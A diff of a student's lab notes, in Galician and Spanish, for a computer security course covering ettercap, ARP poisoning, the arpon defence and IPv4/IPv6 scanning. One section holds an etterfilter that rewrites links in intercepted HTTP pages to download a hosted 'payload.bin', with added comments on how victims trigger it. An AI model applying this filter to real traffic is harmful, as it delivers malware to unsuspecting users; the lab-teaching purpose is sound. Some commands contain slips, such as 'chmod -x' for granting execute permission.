@@ -1,5 +1,11 @@
 # **Práctica 2 Legislación e Seguridad Informática**
 
+> COMANDO ÚTIL PARA ESTA PRÁCTICA:
+>
+>-Si temos que pasarlle archivos á unha máquina de lsi -> scp archivo_origen lsi@ip:directorio_destino
+>
+> Por exemplo -> `scp melonazo.pcap lsi@10.11.48.11:/hom/lsi` (mandas o archivo 'melonazo.pcap' á ruta ruta /home/lsi da máquina 10.11.48.11)
+
 ### **1.-Instale el ettercap y pruebe sus opciones básicas en línea de comando.**
 
    * Instalación de ettercap
@@ -108,6 +114,7 @@
     
   * **Obtenga los distintos “objetos” del tráfico HTTP (imágenes, pdfs, etc.)**
 
+        Unha que filtramos por http, pinchamos en unha peticion e miramos a estructura que ten.
 
   * **Visualice la paquetería TCP de una determinada sesión.**
 
@@ -199,11 +206,16 @@
  
      Indica que se trata de un archivo que contiene reglas o instrucciones para filtrar o procesar datos de acuerdo con ciertos criterios.
 
+     href son os enlaces que che redirigen a outras paginas desde esa mesma páxina. Si envenenando o trafico de unha persona, calquera cousa que faga que cambie 
+     de estado a páxina (pinchando en unha imagen, volvendo para atras, e nun botón desa páxina),x descargase ese payload.
+     
+     msg (replaced href) é para que salte un mensaje por cada href que hai nesa página.
+
      Líneas que meteremos neste archivo:
 
      if (ip.proto == TCP && tcp.src == 80) {
 	      replace("a href", "a href=\"https://tmpfiles.org/dl/207895/payload.bin\">"); #na páxina https://tmpfiles.org/ collemos o payload que generamos antes e metemos no filter o enlace que genera
-	      msg("replaced href.\n");
+	      msg("replaced href.\n"); #imprime un numero de mensajes como este que é igual ao numero de partes da páxina onde se genera o enlace do payload
      }
 
  3º) Procesamos o archivo de filtrado(é como si compilaramos o mal.filter) -> `etterfilter mal.filter -o ig.ef`
@@ -296,7 +308,7 @@
 
  ### **CLIENTE:**
 
- 1º) Facemos unha consulta a unha páxina -> `curl http://example.org`
+ 1º) Facemos unha consulta a unha páxina (da igual cal, si ten envenenado o trafico xeneraselle en calquer href) -> `curl http://example.org`
 
           <!doctype html>
           <html>
@@ -352,6 +364,8 @@
 
   3º)Volvemos a activar o servicio arp@ens33, facemos un restart e ahora ao sacar a tabla de arp deberia aparecer xa a mac do router (dc:08:56:10:84:b9) xa que o arpOn interven
 
+  4º)Podemos mirar o log do arpon en ver o ataque na ruta */var/log/arpon/arpon.conf*
+
 
 
 ### **10.-Pruebe distintas técnicas de host discovey, port scanning y OS fingerprinting sobre las máquinas del laboratorio de prácticas en IPv4. Realice alguna de las pruebas de port scanning sobre IPv6.**
@@ -366,7 +380,7 @@
 
 * Para IPv6:
 
-  Este ano mandaronnos facer un script (.sh) para esta parte xa que executando nmap non escaneaba ben as IPV6 (o script vai un pouco lento pero non tiña tempo para optimizalo).
+  Este ano mandaronnos facer un script (.sh) para esta parte xa que executando nmap non escaneaba ben as IPV6 (o script vai un pouco lento pero non tiña tempo para optimizalo metendolle threads).
 
   Acordardarse de darlle permisos de execución ao script -> `chmod -x nombre.sh`
 
@@ -397,11 +411,11 @@
          if [[ $j =~ ^[0-9]+$ ]]; then
            if [[ $j -ge 0 && $j -le 15 ]]; then
               hexadecimal=$(printf "0%x" $j)
-              ipv6="2002:0a0b:30${hexadecimal}::1"
+              ipv6="2002:0a0b:31${hexadecimal}::1"
               echo "IPv4: $ipv4 -> IPv6: $ipv6"
            else
               hexadecimal=$(printf "%x" $j)
-              ipv6="2002:0a0b:30${hexadecimal}::1"
+              ipv6="2002:0a0b:31${hexadecimal}::1"
                echo "IPv4: $ipv4 -> IPv6: $ipv6"
            fi
          else
